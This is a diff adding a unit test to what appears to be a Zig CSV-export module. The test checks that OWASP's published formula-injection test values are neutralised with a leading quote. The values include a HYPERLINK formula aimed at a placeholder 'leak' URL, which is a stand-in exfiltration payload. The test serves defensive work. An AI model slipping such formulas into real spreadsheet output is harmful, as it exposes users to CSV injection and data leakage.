@@ -187,6 +187,26 @@ test "writeSafe: a signed-number lead followed by a formula tail is guarded (aud
     try expectSafe("+420 555 0101", "+420 555 0101");
 }
 
+test "writeSafe: guards the OWASP WSTG's own test payloads (F2 external anchor)" {
+    // External anchor, not self-authored: these five payloads are the exact
+    // "Formula-Triggering Prefixes" test values published by the OWASP Web
+    // Security Testing Guide's own "Testing for CSV Injection" page —
+    //   https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection
+    //   (section "Place Benign, Detectable Formula-Like Values into Candidate
+    //   Fields", fetched live 2026-08-09) — reproduced byte-for-byte, not
+    //   reworded or invented. `+1+1` and `-1+1` are also, incidentally, the
+    //   OWASP corpus independently landing on the exact `[+-]<digit><formula>`
+    //   shape audit F1 (above) fixed a bypass for.
+    try expectSafe("=1+1", "'=1+1");
+    try expectSafe("+1+1", "'+1+1");
+    try expectSafe("-1+1", "'-1+1");
+    try expectSafe("@SUM(1,1)", "'@SUM(1,1)");
+    try expectSafe(
+        "=HYPERLINK(\"http://example.invalid/leak?test=1\", \"Click Me\")",
+        "'=HYPERLINK(\"http://example.invalid/leak?test=1\", \"Click Me\")",
+    );
+}
+
 // ── Added cases ────────────────────────────────────────────────────────────
 
 test "writeSafe: each dangerous lead char individually" {
